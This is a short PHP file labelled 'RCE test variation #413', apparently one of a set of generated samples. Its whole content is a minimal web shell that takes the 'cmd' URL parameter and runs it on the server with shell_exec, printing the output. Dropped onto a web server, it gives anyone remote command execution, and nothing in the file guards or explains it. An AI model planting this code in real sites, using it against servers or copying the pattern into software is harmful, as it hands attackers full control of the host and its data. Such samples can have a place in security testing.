<?php
// RCE test variation #413
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>